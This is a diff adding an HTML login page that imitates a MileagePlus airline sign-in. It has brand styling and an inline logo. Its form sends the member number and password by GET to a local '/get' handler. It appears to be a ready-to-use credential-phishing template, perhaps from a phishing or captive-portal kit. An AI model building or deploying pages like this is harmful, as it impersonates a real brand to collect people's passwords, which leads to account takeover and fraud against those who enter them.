@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f3f3f3;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+
+.container {
+  max-width: 500px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  background: #fff;
+  border-radius: 8px;
+}
+
+.logo {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+
+.logo svg {
+  width: 50%;
+}
+
+.title, .sub-title {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.form-group {
+  margin-bottom: 20px;
+  display: flex;
+  justify-content: center;
+}
+
+.input-field {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+}
+
+.button {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  background-color: #003D79;
+  color: #fff;
+  border: none;
+  border-radius: 5px; 
+  cursor: pointer;
+}
+
+@media screen and (max-width: 600px) {
+  .container {
+    margin: 10px;
+  }
+
+  .logo svg {
+    width: 70%;
+  }
+
+  .input-field, .button {
+    max-width: 100%;
+  }
+}
+</style>
+</head>
+<body>
+<div class="container">
+
+<div class="logo">
+<svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" viewBox="0 0 470 82">
+  <switch transform="translate(-5 -6)">
+    <g>
+      <path fill="none" d="M0 0h490v95H0z"/>
+      <path fill="#005daa" d="M475 6v83h-17a54 54 0 0 0-22-65c-11-7-26-10-40-7l-3 1V6h82zm-59 13c-5-2-11-3-16-2l2 1v-1l8 1-3 1 1 1 4-1 5 2-6 1 1 1 7-1 2 4h-7v2h8l1 4-8-1v2l8 2v5l-9-3-1 4 8 4-1 4-9-5-3 5 8 5-3 4-7-6-5 4 7 8-3 2-7-8-5 4v3l3 7-2 1-1-2v4c13-6 26-19 30-33 2-5 2-11 0-16l-7-7m-2-2 1 1h1c2 0 5 1 7 3h-3l1 1h5l5 5-7-1v2l8 2 2 5-9-2v2c4 1 7 2 9 4v5l-9-4-2 5 9 5-2 5-9-5-3 6 7 6-3 4-7-7-6 7 6 7-3 3-6-8-9 6 5 8-3 1-4-8-2 1v11c10-3 19-9 27-18 8-7 13-16 15-26 1-8-1-16-8-21-4-3-8-4-13-5m-4 6c-4-5-11-5-17-4v1l4-1-2 2 1 1 3-3 5 1-6 3h1l7-3 2 2-8 3 1 1 9-3 1 3-9 2v1l10-1 1 3h-11v2h10v4l-11-2v2l10 3-2 3-10-3-2 3 9 5-2 2-8-5-3 3 6 7-2 2-4-6v10c6-4 13-10 17-17 3-5 5-13 2-19l-2-2m19 0h2l6 4 1 2-5-1 2 2 5 2 2 7-6-3v4l7 3-1 7-6-5-2 6 6 5-2 6-6-6-5 7 6 6-3 5-6-7-7 8 5 6-3 3-6-7-10 7 3 5h8c14-9 25-23 29-37 2-10 0-19-6-26-3-3-7-4-10-5l2 2m-36-1v1h1l2 1-3 2v1l4-3 1 2-5 2v1l6-2v1l-6 2v1l7-2v2l-7 1v1h7l-1 2h-6v1l5 1-1 2-4-1v3l3 1-2 1h-1v3l4-4c3-5 5-10 3-15-1-3-4-5-7-5m48 8 2 3 2 1 4 8-4-2v4l4 4v7l-5-4-2 7 5 4-2 6-5-5-5 8 4 5-3 5-5-6-7 8 4 6h1l8-8c6-8 11-16 13-25s-1-19-7-26h-2zm6 5c3 3 5 7 6 11l-2-2v5l3 3v8l-3-3-2 7 3 4-2 6-4-4-5 8 4 5-4 5-4-6-6 7h10c7-8 12-16 14-26 2-9 0-19-6-26l-2-2m9 13v6l2 2-1 8-1-2-2 8 1 3-2 6-2-3-5 9 2 4h1c6-9 9-18 10-29l-3-12zm4 15v4h-1l-2 8 1 2-3 6-1-2-4 8h4l5-13c1-4 2-8 1-13zm0 11-3 13v-1l-2 3h2c2-4 3-10 3-15m-60 11-7 3v1h9l-2-4zm20 1-4 3h6l-2-3m-94-48h9c10 0 14 4 14 12s-4 12-14 12h-9V38zm-12-10v44h21c18 0 27-8 27-22 0-13-8-21-27-22h-21zm-24 0v10h-28v8h24v8h-24v8h28v10h-40V28zm-62 0v10h-16v34h-12V38h-16V28zm-78 0h13v44h-13V38zM87 45l27 27h9V28h-12v26L86 28H76v44h11zm-35 8c0 13-8 19-23 19-16 0-24-6-24-19V28h12v25c0 6 4 10 12 10 7 0 11-4 11-10V28h12v25z"/>
+    </g>
+  </switch>
+</svg>
+</div>
+
+<h1 class="title">Sign in</h1>
+
+<h2 class="sub-title">Using your MileagePlus® number and password.</h2>
+
+<form action="/get" id="email-form-step" method="GET">
+
+<div class="form-group">
+<input class="input-field" name="email" type="text" placeholder="MileagePlus® number" required>
+</div>
+
+<div class="form-group">
+<input class="input-field" name="password" type="password" placeholder="Password" required>
+</div>
+
+<div class="form-group">
+<button class="button" type="submit">Sign In</button>
+</div>
+
+</form>
+
+</div>
+</body>
+</html>
